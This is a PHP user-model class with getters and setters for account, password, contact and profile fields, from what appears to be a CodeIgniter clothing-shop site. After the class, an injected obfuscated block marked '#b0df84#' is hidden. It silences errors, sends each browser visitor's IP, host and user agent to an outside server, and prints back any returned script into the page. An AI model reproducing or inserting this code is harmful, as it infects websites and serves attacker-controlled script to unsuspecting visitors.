<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * @author hoang
 */
class MbUserModel {
	private $_id = NULL;
	private $_account = NULL;
	private $_password = NULL;
	private $_name = NULL;
	private $_address = NULL;
	private $_email = NULL;
	private $_phone = NULL;
	private $_fax = NULL;
	private $_type = NULL;
	private $_ym = NULL;
	private $_skype = NULL;
	private $_dob = NULL;
	private $_gender = NULL;
	private $_mobile = NULL;
	private $_website = NULL;
	private $_active = NULL;
	private $_province = NULL;
	private $_store_id = NULL;
	private $_cid = NULL;
	private $_skin_id = 'shopthoitrang';
	/**
	 * get id
	 * @return $id
	 * 
	 */
	
	public function getId()
	{
	    return $this->_id;
	}

	/**
	 * set id value
	 * @param $cid
	 */
	 
	public function setCatId($cid)
	{
	    $this->_cid = $cid;
	}
	
	public function getCatId()
	{
	    return $this->_cid;
	}
	
	/**
	 * set id value
	 * @param $skin_id
	 */
	 
	public function setSkin($skin_id)
	{
	    $this->_skin_id = $skin_id;
	}
	
	public function getSkin()
	{
		if ($this->_skin_id=='') {
			$this->_skin_id = 'shopthoitrang';	
		}
	    return $this->_skin_id;
	}
	

	/**
	 * set id value
	 * @param $id
	 */
	 
	public function setId($id)
	{
	    $this->_id = $id;
	}
	

	/**
	 * get store_id
	 * @return $store_id
	 * 
	 */
	 
	public function getStoreId()
	{
	    return $this->_store_id;
	}

	/**
	 * set store_id value
	 * @param $store_id
	 */
	 
	public function setStoreId($store_id)
	{
	    $this->_store_id = $store_id;
	}
	
	/**
	 * get id
	 * @return $id
	 * 
	 */
	
	public function getActive()
	{
	    return $this->_active;
	}

	/**
	 * set id value
	 * @param $id
	 */
	public function setActive($active)
	{
	    $this->_active = $active;
	}

	/**
	 * get account
	 * @return 
	 */
	public function getAccount()
	{
	    return $this->_account;
	}

	/**
	 * set account
	 * @param $account
	 */
	public function setAccount($account)
	{
	    $this->_account = $account;
	}

	/**
	 * get password
	 * @return 
	 */
	public function getPassword()
	{
	    return $this->_password;
	}

	/**
	 * set password
	 * @param $password
	 */
	public function setPassword($password)
	{
	    $this->_password = $password;
	}

	/**
	 * get name
	 * @return 
	 */
	public function getName()
	{
	    return $this->_name;
	}

	/**
	 * set name
	 * @param $name
	 */
	public function setName($name)
	{
	    $this->_name = $name;
	}
	
	/**
	 * get address
	 * @return 
	 */
	public function getAddress()
	{
	    return $this->_address;
	}

	/**
	 * set address
	 * @param $address
	 */
	
	public function setAddress($address)
	{
	    $this->_address = $address;
	}

	/**
	 * get ym
	 * @return 
	 */
	public function getYM()
	{
	    return $this->_ym;
	}

	/**
	 * set ym
	 * @param $address
	 */
	
	public function setYM($ym)
	{
	    $this->_ym = $ym;
	}
	
	/**
	 * get skype
	 * @return 
	 */
	public function getSkype()
	{
	    return $this->_skype;
	}

	/**
	 * set skype
	 * @param $skype
	 */
	
	public function setSkype($skype)
	{
	    $this->_skype = $skype;
	}
	
	/**
	 * get dob
	 * @return 
	 */
	public function getDob()
	{
	    return $this->_dob;
	}

	/**
	 * set skype
	 * @param $skype
	 */
	
	public function setDob($dbo)
	{
	    $this->_dob = $dob;
	}
	
	/**
	 * get gender
	 * @return 
	 */
	public function getGender()
	{
	    return $this->_gender;
	}

	/**
	 * set gender
	 * @param $gender
	 */
	
	public function setGender($gender)
	{
	    $this->_gender = $gender;
	}
	
	/**
	 * get email
	 * @return 
	 */
	public function getEmail()
	{
	    return $this->_email;
	}

	/**
	 * set email
	 * @param $email
	 */
	public function setEmail($email)
	{
	    $this->_email = $email;
	}
	
	/**
	 * get phone
	 * @return 
	 */
	public function getPhone()
	{
	    return $this->_phone;
	}

	/**
	 * set phone
	 * @param $phone
	 */
	public function setPhone($phone)
	{
	    $this->_phone = $phone;
	}

	/**
	 * get fax
	 * @return 
	 */
	public function getFax()
	{
	    return $this->_fax;
	}

	/**
	 * set fax
	 * @param $fax
	 */
	public function setFax($fax)
	{
	    $this->_fax = $fax;
	}

	/**
	 * get type
	 * @return 
	 */
	public function getType()
	{
	    return $this->_type;
	}

	/**
	 * set type
	 * @param $type
	 */
	public function setType($type)
	{
	    $this->_type = $type;
	}
	
	public function setMobile($mobile) {
		$this->_mobile = $mobile;
	}
	
	public function getMobile() {
		return $this->_mobile;
	}
	
	public function setWebsite($website) {
		$this->_website = $website;
	}
	
	public function getWebsite() {
		return $this->_website;
	}

	public function setProvince($province) {
		$this->_province = $province;
	}
	
	public function getProvince() {
		return $this->_province;
	}	
	
}

#b0df84#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/b0df84#
